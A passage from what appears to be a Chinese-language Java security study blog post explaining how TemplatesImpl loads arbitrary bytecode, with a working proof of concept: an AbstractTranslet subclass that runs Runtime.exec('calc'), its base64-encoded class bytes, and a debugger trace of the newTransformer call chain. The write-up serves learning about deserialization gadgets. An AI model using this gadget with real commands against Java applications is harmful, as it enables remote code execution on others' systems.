        &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里defineclass传入了一个字节数组，所以这里传入的_bytecodes[i]就是我们在上面deifineclass中加载的字节数组</p>
<p>构造：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br></pre></td></tr></table></figure></div>

<p>那么分析到这里可以构造我们的POC为:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplatesImplTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;base64编码的字节码&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;Sentiment&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>但是这样我们直接运行是无法执行的。</p>
<p>在P神的java安全漫谈中说:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须</span><br><span class="line">是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类</span><br></pre></td></tr></table></figure></div>

<p>所以我们这里要构造一个特殊类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line">public void transform(DOM document, SerializationHandler[] handlers)</span><br><span class="line">throws TransletException &#123;&#125;</span><br><span class="line">public void transform(DOM document, DTMAxisIterator iterator,</span><br><span class="line">SerializationHandler handler) throws TransletException &#123;&#125;</span><br><span class="line">public HelloTemplatesImpl() &#123;</span><br><span class="line">super();</span><br><span class="line"> Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里编译成class文件后通过代码将字节码编码成base64格式的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class bianma &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String filePath = &quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class\\&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] classBytes = readClassFile(filePath);</span><br><span class="line">            String base64Encoded = convertToBase64(classBytes);</span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static byte[] readClassFile(String filePath) throws IOException &#123;</span><br><span class="line">        try (FileInputStream fis = new FileInputStream(filePath);</span><br><span class="line">             ByteArrayOutputStream baos = new ByteArrayOutputStream()) &#123;</span><br><span class="line">            byte[] buffer = new byte[4096];</span><br><span class="line">            int bytesRead;</span><br><span class="line">            while ((bytesRead = fis.read(buffer)) != -1) &#123;</span><br><span class="line">                baos.write(buffer, 0, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            return baos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String convertToBase64(byte[] data) &#123;</span><br><span class="line">        return Base64.getEncoder().encodeToString(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>那么最终的POC就为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplatesImplTest &#123;</span><br><span class="line"> public static void main(String[] args) throws Exception &#123;</span><br><span class="line"> Templates templates = new TemplatesImpl();</span><br><span class="line">byte[] bytes = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABxsZWlqaWF6YWkvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAANAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAAQAAQAEQANABIACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">templates.newTransformer();</span><br><span class="line"> &#125;</span><br><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(obj,value);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731192839333.png"
                      alt="image-20230731192839333"
                ></p>
<p>但是这里我们并没有进行newInstance()，但是依然弹出了计算器，</p>
<p>那我们这里就打断点整体分析一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194144950.png"
                      alt="image-20230731194144950"
                ></p>
<p>可以看到这里是显调用了run方法创建一个<code>TransletClassLoader</code> 对象对象</p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194232897.png"
                      alt="image-20230731194232897"
                ></p>
<p>由于我们这里只传入了一个字节数组，所以这里的_bytecodes.length的值就为1，赋值给classCount</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_class = new Class[classCount];</span><br></pre></td></tr></table></figure></div>

<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194642542.png"
                      alt="image-20230731194642542"
                ></p>
<p>可以看到这里第一轮循环，处理了我们传入的字节数组，然后经过if判断将i的值0赋值给了_transletIndex</p>
<p>然后就步出回到了getTransletInstance()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731194955697.png"
                      alt="image-20230731194955697"
                ></p>
<p>可以看到这里调用了_class[0]的newInstance()方法，弹出计算器</p>
<p>所以这就是我们为什么不用再newinstace的原因了。</p>
<p>利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses()-&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div>

<h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>这里等分析完cc3再来学习</p>
<p>这里可以参考P牛的文章：</p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" >https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
